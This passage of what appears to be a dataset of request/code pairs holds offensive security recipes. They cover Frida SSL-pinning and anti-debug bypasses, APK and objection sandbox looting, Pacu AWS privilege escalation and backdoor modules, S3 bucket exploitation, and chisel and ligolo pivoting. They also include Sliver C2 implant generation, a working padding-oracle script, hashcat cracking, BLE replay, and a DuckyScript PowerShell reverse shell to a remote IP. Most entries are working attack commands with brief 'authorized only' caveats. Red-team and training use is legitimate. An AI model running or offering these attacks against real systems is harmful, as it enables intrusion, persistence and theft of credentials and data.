    CertificatePinner.check.overload(
        'java.lang.String', 'java.util.List'
    ).implementation = function (a, b) {
        console.log('[+] SSL pin bypass for ' + a);
        return;
    };
});

// HOOK A NATIVE FUNCTION (libc.strcmp on x64 Linux)
const strcmp = Module.findExportByName('libc.so.6', 'strcmp');
Interceptor.attach(strcmp, {
    onEnter(args) {
        this.a = args[0].readCString();
        this.b = args[1].readCString();
        console.log('strcmp(\"' + this.a + '\",\"' + this.b + '\")');
    },
    onLeave(retval) {
        if (this.a && this.a.startsWith('S')) retval.replace(0); // force \"equal\"
    }
});

// REPLACE A NATIVE FUNCTION COMPLETELY
const target = ptr('0x12345678');
Interceptor.replace(target, new NativeCallback(() => {
    console.log('called');
    return 0;
}, 'int', []));

// READ / WRITE MEMORY
Memory.protect(ptr('0x12345678'), 0x1000, 'rwx');
ptr('0x12345678').writeByteArray([0x90, 0x90, 0x90]);

// INTERESTING TOOLS BUILT ON FRIDA
//   objection         — automated security pentest (no Frida script writing)
//   frida-trace       — auto-generate hooks for matching functions
//   r2frida           — radare2 + Frida
//   medusa            — modular Frida script catalog""",
},
{
    "request": "anti-debug techniques and how to bypass them",
    "language": "text", "framework": "reverse-eng",
    "code": """LINUX
  ptrace(PTRACE_TRACEME) — first thing anti-RE binaries do. Returns -1
    if a debugger already attached. Bypass: hook ptrace via LD_PRELOAD
    or scripted in Frida; or strip with patchelf.
  /proc/self/status → TracerPid != 0 means debugger. Hook open() / read().
  prctl(PR_SET_DUMPABLE, 0) — prevents memory dumps.
  signal() handlers using SIGTRAP for control flow obfuscation (try to
    trace through with gdb's catch SIGTRAP).
  RDTSC timing — debugged execution is slower; threshold check. Defeat
    by patching tsc reads or running outside the debugger.

WINDOWS
  IsDebuggerPresent — userland flag in PEB. NOP it or set to 0 in PEB.
  CheckRemoteDebuggerPresent — same idea via NtQueryInformationProcess.
  NtQueryInformationProcess(ProcessDebugPort/-Flags/-Object). Hook the
    syscall or patch the return.
  PEB.BeingDebugged, PEB.NtGlobalFlag, PEB.HeapFlags — manual flag checks.
  OutputDebugString / RaiseException(DBG_PRINTEXCEPTION_C) — debugger
    catches exception → behavior changes.
  Hardware breakpoints — read DR0-DR7 via NtGetContextThread; if non-zero,
    bail out.
  Self-modifying code + INT3 traps that re-enable themselves.

OBFUSCATION FAMILY
  Control-flow flattening (Tigress/OLLVM) — collapse all blocks into a
    state-machine switch. Defeat with deobfuscators (Ghidra script
    \"OllvmDeflattener\"), symbolic execution (Triton, Miasm), or just
    dynamic tracing (collect actual blocks executed).
  Opaque predicates — always-true conditions disguised as branches.
    Defeat with constant-folding or SMT solver.
  String encryption — every literal stored XOR'd / RC4'd, decrypted on
    use. Hook the decrypt routine, dump strings.
  API hashing — calls Win32 API by hash, not name. Look for the hashing
    fn (often custom CRC32 / FNV / DJB2), enumerate all DLL exports,
    match hashes to recover names.

PRACTICAL BYPASS APPROACH
  1. Run under strace/ltrace first — most anti-debug skips dynamic libs.
  2. Try gdb with LD_PRELOAD ptrace shim:
       cat > ptrace.c <<'EOF'
       long ptrace(int a, int b, int c, int d) { return 0; }
       EOF
       gcc -shared -fPIC -o ptrace.so ptrace.c
       LD_PRELOAD=./ptrace.so gdb ./binary
  3. Patch checks statically (NOP, JMP edits in Ghidra → export).
  4. Frida-trace IsDebuggerPresent / strstr / fopen for /proc/self/status.""",
},

# ═══════════════════════════════════════════════════════════════════════════
# MOBILE
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "Android APK reverse engineering — full workflow",
    "language": "bash", "framework": "mobile",
    "code": """# 1. Get the APK
adb shell pm list packages -f | grep com.target
adb shell cat /data/app/.../base.apk > base.apk
# Or pull from Play via apkpure / apkmirror; for paid apps, pull from device.

# 2. Disassemble (smali) — for low-level edits and resigning
apktool d base.apk -o base_apktool/
# AndroidManifest.xml ↑ readable; smali/ contains disassembly.
# Edit, then: apktool b base_apktool -o patched.apk
#   then: apksigner sign --ks ~/.android/debug.keystore patched.apk

# 3. Decompile to Java (read-only) — for understanding logic
jadx-gui base.apk
# or:  jadx -d base_jadx/ base.apk
# Browse src/. Look at MainActivity, Application subclass, networking
# layer (OkHttpClient setup), token storage, deeplink handlers.

# 4. Pull native libs
unzip -j base.apk 'lib/arm64-v8a/*.so' -d native/
file native/*.so
# Open in Ghidra for native code analysis.

# 5. Inspect dependencies + secrets
strings -n 8 base.apk | grep -E 'http://|https://|api[_-]?key|token|secret'
grep -r 'BuildConfig' base_jadx/   # constants/secrets compiled in

# 6. Manifest review (security-relevant)
xmllint --format base_apktool/AndroidManifest.xml | grep -E '
exported|permission|deepLink|intent-filter|allowBackup|networkSecurityConfig|debuggable'
# allowBackup=true → ADB can pull /data/data/.../ for the app.
# debuggable=true (in prod!) → run any code via run-as.
# exported=true on internal activities/services → other apps can call them.

# 7. Network security config
cat base_apktool/res/xml/network_security_config.xml 2>/dev/null
# trustAnchors with user CA → HTTPS proxying possible without rooting.

# 8. Static find of interesting classes
grep -rE 'CertificatePinner|HostnameVerifier|TrustManager' base_jadx/
grep -rE 'Webview.*addJavascriptInterface' base_jadx/  # CVE-pattern
grep -rE 'createTempFile|MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE' base_jadx/

# 9. Dynamic analysis — Frida + objection (see other patterns)

# 10. Common pwnable mistakes:
#  - Hardcoded API keys in BuildConfig / strings.xml
#  - SSL pinning bypass left in dev build
#  - Exported deeplink that takes URL → opens WebView → XSS / RCE
#  - Insecure WebView with addJavascriptInterface and JS bridge
#  - SQL inj in content provider
#  - Log.d() printing tokens (visible to other apps with READ_LOGS pre-Lollipop)""",
},
{
    "request": "objection — automated Android pentest tool",
    "language": "bash", "framework": "mobile",
    "code": """# Objection wraps Frida with batteries — instant runtime instrumentation
# without writing scripts.

pip install objection
# Need frida-server running on the device.

# Attach + drop into REPL
objection --gadget com.target.app explore

# Inside the REPL:
android hooking list activities
android hooking list services
android hooking list classes
android hooking search classes Login
android hooking list class_methods com.target.LoginActivity
android hooking watch class_method com.target.LoginActivity.checkPassword \\
   --dump-args --dump-return --dump-backtrace

# Bypass SSL pinning (try default + custom)
android sslpinning disable

# Bypass root detection
android root disable

# Pull files from app sandbox
ls /data/data/com.target.app/
file download /data/data/com.target.app/databases/users.db ./users.db

# Read shared preferences (often where tokens live)
android hooking generate simple com.target.app   # find sharedprefs locations
# Or just:
ls /data/data/com.target.app/shared_prefs/
file download /data/data/com.target.app/shared_prefs/auth.xml ./auth.xml

# Inspect SQLite databases
sqlite3 users.db
.tables
.schema users
SELECT * FROM users;

# Memory dump (find tokens, keys)
memory list modules
memory list exports libssl.so
memory dump all ./mem/   # large; dump specific modules instead

# Useful bypass commands:
android hooking set return_value <method> false
android hooking set return_value <method> true""",
},

# ═══════════════════════════════════════════════════════════════════════════
# CLOUD ATTACKS (authorized testing only)
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "AWS pentesting with Pacu — workflow",
    "language": "bash", "framework": "cloud",
    "code": """# Pacu is the AWS exploitation framework — modules for enum, privesc,
# data exfil, cleanup. Authorized pentests / your own accounts only.

pip install pacu
pacu

# In the REPL:
new_session demo
set_keys                                 # paste access key + secret
whoami                                   # confirm identity

# RECON
run iam__enum_users_roles_policies_groups
run iam__bruteforce_permissions          # find what your key can ACTUALLY do
run iam__enum_assume_role                # roles you can assume
run ec2__enum                            # EC2 instances, AMIs, security groups
run s3__enum                             # buckets you can list
run lambda__enum                         # functions + envs
run rds__enum
run guardduty__list                      # know if blue team is watching

# PRIVESC — Pacu's signature module
run iam__privesc_scan
# Tries 25+ privesc paths automatically:
#  - CreatePolicyVersion
#  - AttachUserPolicy / AttachRolePolicy
#  - PassRole + iam:CreateInstanceProfile + ec2:RunInstances
#  - PassRole + lambda:CreateFunction + lambda:Invoke
#  - UpdateAssumeRolePolicy (overwrite trust policy of admin role)
#  - sts:AssumeRole on broad role with wildcard
#  - codebuild:CreateProject + iam:PassRole
#  - cloudformation:CreateStack + capability_iam

# DATA HUNT
run s3__bucket_finder
run s3__download_bucket
run lambda__download_source_code
run cloudtrail__download_event_history
run secrets_manager__enum
run rds__explore_snapshots

# PERSISTENCE / BACKDOOR (only for full red-team eng)
run iam__backdoor_users_keys
run iam__backdoor_users_password
run lambda__backdoor_new_users

# COMPLEMENTARY TOOLS
#   ScoutSuite          — read-only audit (CSPM-style)
#   Prowler             — CIS benchmark + custom checks
#   CloudFox            — \"what can this user do\" focused
#   awscli with --debug — manual targeted enum
#   Kingfisher / TruffleHog — secrets in code that grant cloud access""",
},
{
    "request": "AWS IAM enumeration with bruteforce permissions",
    "language": "bash", "framework": "cloud",
    "code": """# When you have AWS keys with unknown permissions — find out what they
# can do without asking IAM (the keys often can't read iam:* on themselves).

# 1. Identity check (always works)
aws sts get-caller-identity

# 2. Brute-force what API calls succeed
# Enumerate ~10000 API calls; stop at any AccessDenied (key-specific) vs
# UnauthorizedOperation vs success. The JSON output tells you what permissions
# the key actually holds.

# Tools:
#   weirdAAL        — custom permission brute, very thorough
#   enumerate-iam   — github.com/andresriancho/enumerate-iam (read-only)
#   Pacu's iam__bruteforce_permissions module

git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip install -r requirements.txt
python enumerate-iam.py --access-key AKIA... --secret-key ... --region us-east-1

# Output: list of confirmed allowed actions. Cross-check against:
#   github.com/iann0036/iam-dataset                — full action list
#   gwen001's privilege escalation matrix
#   Pacu's iam__privesc_scan

# 3. Targeted manual checks (most fruitful)
# Can I list users? (basic recon)
aws iam list-users 2>&1 | head -3

# Can I read my own policies (often allowed even when list-users isn't)?
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $NF}')
aws iam list-user-policies --user-name <me>
aws iam get-user-policy --user-name <me> --policy-name <name>

# Can I assume any role I see?
for role in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
    aws sts assume-role --role-arn arn:aws:iam::ACCT:role/$role \\
        --role-session-name pacu --duration-seconds 900 2>&1 | head -1
done

# Always run with --no-sign-request first on public buckets to avoid
# burning the keys' identity in CloudTrail.""",
},
{
    "request": "S3 misconfigurations — finding and exploiting",
    "language": "bash", "framework": "cloud",
    "code": """TARGET=example.com

# 1. Find buckets via subdomain + CT logs + Wayback URL parsing
subfinder -d $TARGET -silent | grep -E 's3|cloudfront|aws' > maybe_buckets.txt
curl -s \"https://crt.sh/?q=%25.s3.amazonaws.com&output=json\" \\
  | jq -r '.[].name_value' | grep -i $TARGET >> maybe_buckets.txt

# 2. Tools that brute + find buckets associated with a name
# kiterunner / s3scanner / bucket_finder / cloud_enum
git clone https://github.com/sa7mon/S3Scanner
S3Scanner scan --bucket $TARGET-data
S3Scanner scan --bucket-file maybe_buckets.txt --threads 50

# 3. Manual common naming patterns
for name in $TARGET ${TARGET}-prod ${TARGET}-dev ${TARGET}-backup \\
            ${TARGET}-uploads ${TARGET}-static ${TARGET}-logs \\
            ${TARGET}-public ${TARGET}-internal ${TARGET}-images; do
    aws s3 ls s3://$name --no-sign-request 2>&1 | head -1
done

# 4. Once a bucket is found — enumerate ACL/policy:
aws s3api get-bucket-acl --bucket NAME --no-sign-request
aws s3api get-bucket-policy --bucket NAME --no-sign-request
aws s3api get-bucket-policy-status --bucket NAME --no-sign-request

# 5. Common misconfigs (each = a finding):
# a. Public ListBucket — directory listing of all keys
aws s3 ls s3://NAME --no-sign-request
# b. Public GetObject on ALL keys
aws s3 cp s3://NAME/file.pdf - --no-sign-request | head
# c. Public PutObject — write to bucket → defacement / serve malware
echo test > t; aws s3 cp t s3://NAME/poc.txt --no-sign-request
# d. Public PutBucketPolicy — modify policy → full takeover
# e. PutBucketAcl with anyAuthenticatedAWS → any AWS user can read

# 6. Sensitive files to look for in confirmed-readable buckets:
#    *.sql, *.tar.gz, *.bak, *.zip
#    backup/, dump/, terraform/, ansible/, .env, *.json (creds)
#    .git/, .ssh/, deploy/
#    customer-data/, exports/, billing/, invoices/

# 7. Account-level surprises:
# If you find an unauth bucket and look at the bucket policy or via
# `head-bucket --bucket NAME --no-sign-request` you get the AccountId.
# That's pivot intel.

# RESPONSIBLE DISCLOSURE — never download more than necessary to PoC.
# Note exact filename + a hash in the report; don't host the data.""",
},
{
    "request": "Azure AD enumeration with ROADtools / AzureHound",
    "language": "bash", "framework": "cloud",
    "code": """# AzureHound — generates BloodHound graph data for Azure AD/Entra
azurehound -u user@tenant.onmicrosoft.com -p Passw0rd! list -o azure.json
# Or with refresh token / device code auth:
azurehound -r '0.AAAA...' list -o azure.json

# Import into BloodHound 5+ (the community edition supports Azure data)
# bloodhound-cli import azure.json

# ROADtools — Python-based, great for custom queries
pip install roadtools roadrecon
roadrecon auth -u user@tenant -p Passw0rd!
# OR: roadrecon auth --device-code     (when MFA is on but you have a code)
# OR: roadrecon auth --access-token AAA...

roadrecon gather                       # pulls users, groups, apps, roles
roadrecon gui                          # web UI on http://127.0.0.1:5000

# Useful CLI queries
roadrecon dump --type users
roadrecon dump --type applications     # apps + their scopes
roadrecon dump --type serviceprincipals
roadrecon dump --type devices

# HIGH-VALUE PATHS TO CHECK
# 1. Privileged role members
#    Global Admin, Privileged Role Admin, Application Admin, Cloud App Admin,
#    Authentication Admin, User Admin, SharePoint Admin
# 2. Apps with high permissions but no expiration on creds
# 3. Service principals with Application.ReadWrite.All (own the tenant)
# 4. Conditional Access Policy gaps (legacy auth allowed, no MFA scope...)
# 5. Stale guest accounts / external domains in trust list
# 6. Azure AD Connect server credentials (DCSync potential to on-prem)

# Pivot to subscriptions:
az login --tenant <tenantId>
az account list
az role assignment list --all
# Owner / Contributor on a sub → full Azure compute compromise.

# COMPLEMENTARY TOOLS
#   AADInternals (PowerShell)         — deep tenant attacks
#   MicroBurst                        — Azure-focused offensive PowerShell
#   Stormspotter                      — Azure visualizer (older, BH replaced)
#   PingCastle / Purple Knight        — defense audit
#   GraphRunner                       — modern post-exploit on M365 Graph""",
},

# ═══════════════════════════════════════════════════════════════════════════
# PIVOTING / C2 (authorized red team)
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "pivoting tunnels — chisel, ligolo-ng, sshuttle",
    "language": "bash", "framework": "pivoting",
    "code": """# Goal: route attacker host's traffic to internal target network through
# a compromised intermediary (foothold). Authorized engagements only.

# CHISEL — TCP/UDP over HTTP, fast, single binary, both ends.
# On attacker (server):
chisel server -p 8080 --reverse --auth user:pass

# On compromised host (client) — reverse SOCKS:
chisel client http://attacker:8080 R:1080:socks
# Now on attacker, SOCKS proxy at 127.0.0.1:1080 routes into internal net.

# Use proxychains:
echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
proxychains4 nmap -sT -Pn -p 80,443,445 10.10.20.0/24

# Reverse port forward (attacker:9999 → internal:445)
chisel client http://attacker:8080 R:9999:10.10.20.5:445

# ─────────────────────────────────────────────────────────────────────

# LIGOLO-NG — modern, runs as a tun interface on attacker side.
# Routes any tool natively (no proxychains needed) — including raw socket
# scanning (nmap -sS works through ligolo).

# Attacker:
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# Connect at https://attacker:11601

# Compromised host:
./agent -connect attacker:11601 -ignore-cert

# In ligolo proxy console:
session
> 1
ifconfig
> add 10.10.20.0/24 ligolo
sudo ip route add 10.10.20.0/24 dev ligolo
# Now: nmap, smbclient, evil-winrm — all native, fast.

# ─────────────────────────────────────────────────────────────────────

# SSHUTTLE — VPN-style routing over SSH (when you have SSH on the foothold)
sshuttle -r user@foothold 10.10.20.0/24
# Routes /24 through the SSH session. Easiest pivot when SSH already works.

# ─────────────────────────────────────────────────────────────────────

# WINDOWS-SPECIFIC OPTIONS
# When the foothold is Windows and outbound HTTP works:
#   chisel.exe (cross-compile, runs anywhere)
#   ligolo agent.exe (signed binary works through some EDR)
#   Cobalt Strike SOCKS / rportfwd (if licensed)
#   Sliver portfwd (open source C2 — see sliver pattern)

# OPSEC NOTES (red team)
#   - Outbound 443 is least suspicious. Choose chisel/ligolo HTTPS modes.
#   - Domain fronting / CDN-fronted servers reduce attribution.
#   - JA3 fingerprint of your tooling is logged by EDR — plan for it.""",
},
{
    "request": "Sliver C2 — modern open-source command and control (authorized red team)",
    "language": "bash", "framework": "c2",
    "code": """# Sliver — github.com/BishopFox/sliver — Go-based C2, free, well-documented.
# Use only on engagements with written authorization.

# Server setup (on attacker box)
curl https://sliver.sh/install | sudo bash
sliver-server                                # interactive console
> new-operator --name op1 --lhost <ip>      # generate op1.cfg
> multiplayer                                # listen for ops

# Operator
sliver-client import op1.cfg
sliver

# Listeners (multiple protocols at once)
http   --domains target.com --lport 80
https  --domains target.com --lport 443
mtls   --lhost 0.0.0.0 --lport 8888
dns    --domains c2.target.com --persistent

# Generate implant
generate --mtls 1.2.3.4 --os windows --arch amd64 --save ./impl.exe
generate --http http://1.2.3.4 --os linux  --arch amd64 --save ./impl
generate beacon --http https://target.com --os windows --jitter 30s --interval 60s

# OBFUSCATION
generate stager --lhost 1.2.3.4 --lport 443 --format raw --save stager.bin
# Pair with obfuscator: garble for Go source, donut for shellcode wrapping.

# OPERATOR ACTIONS (after callback)
sessions                                    # list connected impls
use <session_id>
info
shell                                       # interactive shell
execute -o whoami
execute-shellcode --pid 1234 ./payload.bin
upload ./mimikatz.exe C:\\\\Users\\\\Public\\\\
download C:\\\\Users\\\\Admin\\\\Documents\\\\creds.txt
screenshot
ifconfig
netstat
ps
kill <pid>

# PIVOTING (built-in)
portfwd add --bind 1080 --remote 10.10.20.5:445   # local port forward
socks5 start                                       # SOCKS proxy on operator

# BOFs (Beacon Object Files — running CS-style BOFs in Sliver)
extension install <bof_extension>
extension run nanodump

# DEFENSIVE NOTES (so the blue side has a fair shot)
#   - Sliver's default mTLS implant has a recognizable JA3.
#   - HTTP profiles are configurable — read sliver-server's
#     /home/.../implant.go templates and customize.
#   - Many EDRs detect default-config Sliver. Tweak templates, strip
#     symbols, custom obfuscation as part of the engagement.""",
},

# ═══════════════════════════════════════════════════════════════════════════
# CRYPTOGRAPHIC ATTACKS
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "padding oracle attack on CBC mode",
    "language": "python", "framework": "crypto-attacks",
    "code": """# A padding oracle is a system that distinguishes \"valid PKCS#7 padding\"
# from \"invalid\" — even if it doesn't return the plaintext. That's enough
# to decrypt arbitrary ciphertext, byte by byte, in O(256 * blocksize).

# CLASSIC: a webapp uses AES-CBC for cookie encryption. Bad cookie returns
# 500 (padding error). Good-padding-but-app-error returns 200/redirect.
# That difference IS the oracle.

# Concept: P_i = D(C_i) XOR C_(i-1)
# We can flip bits in C_(i-1) to control the LAST byte of decrypted P_i.
# Try all 256 values of the last byte of C_(i-1) until oracle says
# \"padding valid\" — that means the last byte of decrypted plaintext is 0x01.
# Now we know D(C_i)[-1]; XOR with original C_(i-1)[-1] to recover P_i[-1].
# Repeat for byte before, target padding 0x02 0x02, etc.

import requests

ORACLE = 'https://app/decrypt'  # endpoint that takes a base64 ct as cookie

def is_valid(ct: bytes) -> bool:
    r = requests.get(ORACLE, cookies={'session': base64.b64encode(ct).decode()})
    return r.status_code != 500       # tune per real app

def decrypt_block(prev_block: bytes, target_block: bytes) -> bytes:
    \"\"\"Decrypts target_block (16 bytes) using prev_block as IV.\"\"\"
    intermediate = bytearray(16)
    for i in range(15, -1, -1):
        pad = 16 - i
        for guess in range(256):
            forged = bytearray(b'\\x00' * 16)
            for j in range(i + 1, 16):
                forged[j] = intermediate[j] ^ pad
            forged[i] = guess
            if is_valid(bytes(forged) + target_block):
                # avoid the lucky-padding false positive on first byte
                if i == 15:
                    forged_check = bytearray(forged)
                    forged_check[14] ^= 1
                    if not is_valid(bytes(forged_check) + target_block):
                        continue
                intermediate[i] = guess ^ pad
                break
    plaintext = bytes(intermediate[k] ^ prev_block[k] for k in range(16))
    return plaintext

# For a multi-block ciphertext: split into 16-byte blocks, run on each
# (block_i-1, block_i) pair.

# DEFENSE — switch to AEAD (AES-GCM, ChaCha20-Poly1305). Auth tag prevents
# the oracle from existing. NEVER hand-roll CBC + HMAC; even if you do,
# strict constant-time MAC + verify-before-decrypt closes the oracle.

# TOOL: padbuster (Perl, classic) — automates the whole thing if you have
# the oracle URL pattern.""",
},
{
    "request": "ECB pattern detection and exploitation",
    "language": "python", "framework": "crypto-attacks",
    "code": """# ECB encrypts each 16-byte block independently. Identical plaintext →
# identical ciphertext. Pattern leaks immediately on repeated data.

# DETECTION (canonical: \"ECB penguin\")
def is_ecb(ciphertext: bytes, blocksize: int = 16) -> bool:
    blocks = [ciphertext[i:i+blocksize] for i in range(0, len(ciphertext), blocksize)]
    return len(blocks) != len(set(blocks))   # any duplicate → ECB

# Send a long known plaintext like b'A' * 64, get ciphertext, check.

# EXPLOITATION 1 — ECB BYTE-AT-A-TIME (oracle returns enc(prefix + user_input + secret))
# Recover the secret one byte at a time using known-block alignment.
def ecb_byte_at_a_time(oracle, blocksize=16):
    # find length of unknown
    base = len(oracle(b''))
    for i in range(1, blocksize+1):
        l = len(oracle(b'A' * i))
        if l > base: break
    secret_len = base - i

    discovered = b''
    while len(discovered) < secret_len:
        block_index = len(discovered) // blocksize
        prefix_len = blocksize - 1 - (len(discovered) % blocksize)
        prefix = b'A' * prefix_len

        # Build dictionary of all 256 possible last bytes
        target = oracle(prefix)[block_index*blocksize:(block_index+1)*blocksize]
        for guess in range(256):
            test = prefix + discovered + bytes([guess])
            ct = oracle(test)[block_index*blocksize:(block_index+1)*blocksize]
            if ct == target:
                discovered += bytes([guess])
                break
    return discovered

# EXPLOITATION 2 — ECB cut-and-paste (e.g., admin cookie forging)
# When auth cookie format = ECB-encrypt(\"role=user&name=X&\")
# Craft username 'admin\\x0b\\x0b...' so its block aligns with end-of-string,
# then swap blocks: copy that \"admin\" block into another cookie.

# DEFENSE — never use ECB for anything except scrambling fixed-size,
# distinct keys (and even then, prefer GCM-SIV). Use AES-GCM / ChaCha20-Poly1305.""",
},
{
    "request": "hash cracking strategy — modes, wordlists, rules",
    "language": "bash", "framework": "crypto-attacks",
    "code": """# 1. IDENTIFY THE HASH FORMAT
hash-identifier
hashid -m 'hash_string'
# Or just inspect: $1$ → MD5 crypt, $5$ → SHA-256 crypt, $6$ → SHA-512 crypt,
#                   $argon2id$ → argon2id, $2y$ → bcrypt, $7$ → scrypt.

# 2. PICK THE HASHCAT MODE (-m)
# Common modes:
#  0    MD5
#  100  SHA-1
#  500  md5crypt ($1$)
#  1400 SHA-256
#  1500 DEScrypt (12 chars truncated — old /etc/shadow)
#  1700 SHA-512
#  1800 sha512crypt ($6$)            # modern Linux /etc/shadow
#  3200 bcrypt ($2y$)                # modern web frameworks
#  10000 Django pbkdf2_sha256
#  13100 Kerberos 5 TGS-REP (krb5tgs)  # kerberoasting
#  18200 Kerberos 5 AS-REP             # AS-REP roasting
#  22000 WPA-EAPOL-PBKDF2              # WiFi handshakes (modern, replaces 2500)
#  16500 JWT HS256

# 3. WORDLIST CHOICE
#  rockyou.txt                          14M passwords — start here for any web
#  SecLists/Passwords/Leaked-Databases/ multiple regional sets
#  CrackStation realistic               1.5B (paid → freely available copy)
#  hashes.org list dumps                modern leak distillations
#  Custom: site name + year + common suffixes

# 4. RULES (multiplies wordlist effectiveness)
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# best64.rule              ~ 64 transformations (case, leetspeak, append digits)
# OneRuleToRuleThemAll.rule ~ 50K rules — nuclear option, slow but effective
# rockyou-30000.rule        ~ 30K rules

# 5. ATTACK MODES
hashcat -a 0 -m 0 hash.txt rockyou.txt                # straight (wordlist)
hashcat -a 1 -m 0 hash.txt left.txt right.txt         # combinator
hashcat -a 3 -m 0 hash.txt ?d?d?d?d?l?l?l            # mask
hashcat -a 6 -m 0 hash.txt rockyou.txt ?d?d?d        # hybrid wordlist+mask
hashcat -a 7 -m 0 hash.txt ?d?d?d rockyou.txt        # hybrid mask+wordlist
# ?l = lowercase, ?u = upper, ?d = digit, ?s = special, ?a = all printable.

# 6. MAKE THE GPU SWEAT
hashcat -O -w 4 ...      # optimized kernel + workload profile 4 (max)
# -O speeds many algos but caps password length at 31. Enough for 95% real cases.

# 7. CRACKED HASHES → look in $HOME/.local/share/hashcat/hashcat.potfile
# Or: hashcat --show -m <mode> hash.txt

# 8. SMART STRATEGY
#  a. Quick: rockyou + best64 (~5 min on a single GPU for fast hashes)
#  b. Mid:   rockyou + OneRuleToRuleThemAll (60 min)
#  c. Long:  PRINCE attack — generates likely passwords from word patterns
#  d. Targeted: build custom wordlist from target's domain (cewl, crunch)

# 9. JOHN THE RIPPER alternative
john --format=sha512crypt hash.txt --wordlist=rockyou.txt --rules=Jumbo""",
},

# ═══════════════════════════════════════════════════════════════════════════
# WIRELESS / HARDWARE
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "BLE security testing — sniff and replay",
    "language": "bash", "framework": "wireless",
    "code": """# Bluetooth Low Energy — common in IoT (locks, fitness, medical, toys).
# Attack surface: pairing, authentication (or lack of), characteristic
# read/write authz, replay, MITM.

# 1. SCAN — find devices
sudo bluetoothctl
> scan on
# Note MAC addresses, advertised names, RSSI for proximity.

# 2. CONNECT + ENUMERATE GATT SERVICES
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary             # list GATT services
> characteristics     # all characteristics + their handles
> char-read-hnd 0x0e  # read by handle
> char-write-req 0x12 0102030405

# Better tool: nRF Connect (mobile app) — reads / writes any characteristic
# without scripting, great for first triage.

# 3. SNIFF TRAFFIC
# Hardware: Ubertooth One, nRF52840-dongle (best price/perf), TI CC1352.
# With nRF52 + sniffer firmware:
sudo nrfsniffer -d /dev/ttyACM0
# Pipes to Wireshark — filter by access address, watch pairing exchange.

# Sniffle (TI CC26x2) — modern, supports BLE 5 LE Coded
git clone https://github.com/nccgroup/Sniffle
sniff_receiver.py -d /dev/ttyACM0 -o capture.pcap

# 4. REPLAY ATTACK (devices without authentication)
# Capture a write to e.g. \"unlock\" handle.
# Replay it.
gatttool -b TARGET --char-write-req --handle 0x12 --value <captured_bytes>
# Many cheap smart locks, sex toys, vapes, cheap fitness trackers fail here.

# 5. PAIRING DOWNGRADE / KNOB
# Older devices accept lowest entropy in BLE LE Pairing → trivial brute.
# Tools: BTLE-jack, btlejuice (MITM), gattacker.

# 6. CHARACTERISTIC AUTHORIZATION FLAWS
# Read every characteristic — many devices don't enforce \"requires auth\"
# on reads → expose serial, firmware version, even keys.

# 7. FIRMWARE EXTRACTION
# OTA update characteristic → request the firmware blob → reverse it
# offline. Check for hardcoded keys / pairing PINs.

# DEFENSE
#   - LE Secure Connections (BLE 4.2+) with ECDH key exchange.
#   - Out-of-band pairing or numeric comparison (not Just Works).
#   - Authenticate every characteristic that does state-change.
#   - Encrypt + MAC OTA updates with a chip-rooted key.""",
},
{
    "request": "USB attack platforms — Rubber Ducky, Bash Bunny, Flipper Zero",
    "language": "text", "framework": "hardware",
    "code": """USB ATTACK = computer trusts USB descriptors. Plugging in a device that
declares itself an HID keyboard means it can type anything fast.

RUBBER DUCKY (Hak5) — programmable USB keyboard
  - Acts only as HID. ~1000 wpm typing. Payload = Ducky Script.
  - Use case: drop a payload while \"helping\" someone, kiosks, unlocked
    laptop on a desk for 8 seconds.

  Example DuckyScript v3 (Windows reverse shell):
    DELAY 1500
    GUI r
    DELAY 500
    STRING powershell -w h -nop -c \"$c=New-Object Net.Sockets.TCPClient('1.2.3.4',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$h=$o+'PS '+(pwd).Path+'>';$x=([text.encoding]::ASCII).GetBytes($h);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()\"
    ENTER

BASH BUNNY (Hak5) — multi-class USB device, multiple personalities
  - Can present as: HID, USB Mass Storage, Ethernet (RNDIS), Serial.
  - The killer move: present as Ethernet → become DHCP server →
    \"network gateway\" → attacker_ip → all DNS / HTTP traffic routes
    through it. \"PoisonTap\"-style capture of cookies/sessions.
  - Has full Linux on board → run nmap, responder, etc, locally.

FLIPPER ZERO — sub-1GHz radio + RFID + NFC + IR + GPIO + USB
  - Cloning HID/iCLASS access cards (read + replay if not encrypted).
  - Capture/replay sub-1GHz remotes (gates, garages — only on devices
    you own; rolling-codes resistant).
  - BLE / Bluetooth pairing nuisance (BLE spam, recently mitigated).
  - Bad USB mode (HID payload runner).
  - GPIO for hardware probing (UART, SPI, I2C — pin out).

OMG CABLE / BASH BUNNY MK2 — looks like a real USB-C cable, hides keystroke
  injection + WiFi for remote payload triggering.

DEFENSE
  - Whitelist USB device IDs at the OS level (USBGuard on Linux,
    Group Policy USB restrictions on Windows, MDM control).
  - Lock screen on AFK — even 5 seconds is enough for a Ducky payload.
  - Disable autorun.
  - Tamper-evident port covers in sensitive areas.
  - For high-target users (CEO, infra eng): use a USB data blocker for
    public charging.""",
},

# ═══════════════════════════════════════════════════════════════════════════
# SOURCE-CODE AUDIT & FUZZING
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "source code security audit — methodology",
    "language": "text", "framework": "appsec-audit",
    "code": """1. UNDERSTAND THE APP. Run it locally if possible. Read README, docs,
   ARCHITECTURE.md. Map: routes / endpoints / RPC methods, data flows,
   trust boundaries, where input enters the system.

2. INVENTORY THE STACK + DEPS. Note framework versions, ORM, queue, cache,
   serializer. Run dependency audit:
     pip-audit (Python), npm audit / pnpm audit (JS), bundler-audit (Ruby),
     govulncheck (Go), trivy fs . (everything).
   Known-CVE deps are easy wins for a report.

3. THREAT MODEL QUICKLY. STRIDE per component:
     S — spoofing identity (auth)
